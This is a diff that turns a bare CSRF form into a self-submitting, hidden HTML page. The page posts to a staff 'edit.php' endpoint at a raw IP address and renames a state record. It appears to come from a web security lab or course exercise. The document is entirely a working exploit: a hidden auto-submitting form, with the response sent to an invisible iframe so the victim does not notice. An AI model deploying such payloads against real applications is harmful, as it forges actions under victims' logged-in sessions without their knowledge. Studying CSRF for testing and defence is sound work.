@@ -1,8 +1,13 @@
-<form name="csrfForm" action="https://35.184.88.145/blue/public/staff/states/edit.php?id=1" method="POST">
- <input type="hidden" name="name" value="Alabamaa" /> 
- <input type="hidden" name="code" value=AL /> 
- <input type="hidden" name="country_id" value=1 /> 
-</form>
-<script>
- document.csrfForm.submit();
-</script>
+<html>
+  <head>
+    <title>Csrf Form</title>
+  </head>
+  <body onload="document.csrfForm.submit()">
+    <form name="csrfForm" action="https://35.184.88.145/blue/public/staff/states/edit.php?id=1" method="POST" style="display: none;" target="hidden_results">
+     <input type="hidden" name="name" value="Alabamaa" /> 
+     <input type="hidden" name="code" value=AL /> 
+     <input type="hidden" name="country_id" value=1 /> 
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
